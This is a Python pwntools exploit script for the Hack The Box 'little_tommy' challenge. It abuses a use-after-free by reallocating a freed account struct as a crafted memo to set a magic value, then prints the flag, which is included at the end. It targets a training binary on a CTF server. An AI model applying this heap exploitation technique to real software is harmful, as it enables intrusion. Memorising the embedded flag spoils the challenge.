#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template little_tommy --host 88.198.233.174 --port 38746
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./exe/little_tommy')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '88.198.233.174'
port = int(args.PORT or 38746)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

"""
struct account { // sizeof(account) = 72
 char first_name[32];
 char last_name[32];
 int balance;
 int __unused__;
}
"""
PROMPT = "flag"

# create an account
io.sendlineafter(PROMPT, "1")
io.sendline("test")
io.sendline("test")

# delete the account
io.sendlineafter(PROMPT, "3")

# alloc a memo with same size as account struct
# in this way, it willl get the same address on the heap
# len("A" * 64 + 0x6B637566 +  "A" * 2 + "\n" + "\x00") = 72
io.sendlineafter(PROMPT, "4")
crafted = "A" * 64 + p32(0x6B637566) + "A" * 2
log.info("Crafted string ({}): {}".format(len(crafted), crafted))
io.sendline(crafted)

# delete account function is buggy, use it to free current memo pointer
# the following account created will have the same address
io.sendlineafter(PROMPT, "3")

# create an account again
io.sendlineafter(PROMPT, "1")
io.sendline("test")
io.sendline("test")

# get the flag
io.sendlineafter(PROMPT, "5")
io.recvuntil("HTB")
log.success("Flag: HTB" + io.recvline().strip("\n"))

# flag HTB{I_am_so_heaped_up_right_now}
